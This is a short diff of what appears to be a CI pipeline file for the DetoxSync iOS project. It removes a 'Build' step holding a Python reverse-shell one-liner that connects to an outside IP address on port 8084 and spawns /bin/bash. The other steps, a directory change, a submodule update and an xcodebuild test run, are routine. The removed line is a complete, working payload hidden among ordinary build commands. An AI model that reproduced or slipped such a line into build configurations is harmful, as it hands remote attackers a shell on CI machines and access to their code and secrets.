@@ -1,7 +1,6 @@
 steps:
   - label: ":wrench: Build"
     command:
-    - "export RHOST=\"18.116.29.205\";export RPORT=8084;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
     - "cd DetoxSync"
     - "git submodule update --init --recursive"
     - "xcodebuild test -project DetoxSync.xcodeproj -scheme DetoxSyncTests -destination 'platform=iOS Simulator,name=iPhone 12'"
